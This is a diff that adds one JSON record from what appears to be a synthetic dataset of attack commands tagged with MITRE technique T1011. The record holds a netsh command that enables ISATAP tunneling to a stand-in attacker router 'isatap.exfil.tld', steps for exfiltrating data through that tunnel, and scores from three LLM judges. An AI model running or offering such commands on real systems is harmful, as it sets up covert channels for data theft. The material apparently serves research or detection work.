@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface isatap set state state=enabled; netsh interface isatap set router isatap.exfil.tld",
+  "explanation": "Activates ISATAP and points it to a custom router, enabling IPv6-in-IPv4 tunneling as an alternate medium suitable for exfiltration (T1011).",
+  "rationale_steps": [
+    "Enable ISATAP to encapsulate IPv6 over IPv4, creating a distinct communication path.",
+    "Direct the tunnel to an attacker-controlled ISATAP router.",
+    "Use the tunnel to transfer data over IPv6 where monitoring may be weaker."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-7845b056",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Two well-formed netsh commands separated by a valid PowerShell semicolon with parameters consistent with netsh isatap syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "On supported Windows and with admin rights this enables ISATAP and sets a router (setup step only), but it neither performs exfiltration itself, requires elevation despite 'Privilege: None', and its use of IPv6-in-IPv4 is not clearly an 'other network medium' per T1011.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T01:21:37.637040Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for netsh commands, correct use of semicolon as a command separator, and valid parameter formats.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements ISATAP tunneling which could be used for exfiltration over an alternate network medium, though it requires the attacker to control the specified domain and have proper network configurations in place.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T01:21:40.616601Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct `netsh` syntax, valid parameters, and a proper command separator, making it perfectly well-formed and parseable.",
+        "semantic_score": 2,
+        "semantic_justification": "The command requires administrative privileges to execute successfully, directly contradicting the stated 'Privilege: None' and preventing it from achieving the claimed intent operationally.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:29:47.470702Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
